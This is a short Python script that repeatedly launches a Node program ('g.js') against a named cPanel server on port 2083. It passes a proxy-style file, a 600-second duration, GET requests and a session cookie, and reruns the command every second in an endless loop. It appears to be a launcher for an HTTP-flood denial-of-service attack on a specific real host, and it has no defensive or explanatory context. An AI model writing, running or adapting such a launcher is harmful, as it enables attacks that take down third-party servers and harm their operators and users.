import schedule
import time
import os
import sys

os.system('node g.js https://sg2plmcpnl486379.prod.sin2.secureserver.net:2083 http.txt 600 GET PHPSESSID:gq15q5ho3eqq6gatdqm6nqdva5')

def job():
    os.system('node g.js https://sg2plmcpnl486379.prod.sin2.secureserver.net:2083 http.txt 600 GET PHPSESSID:gq15q5ho3eqq6gatdqm6nqdva5')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
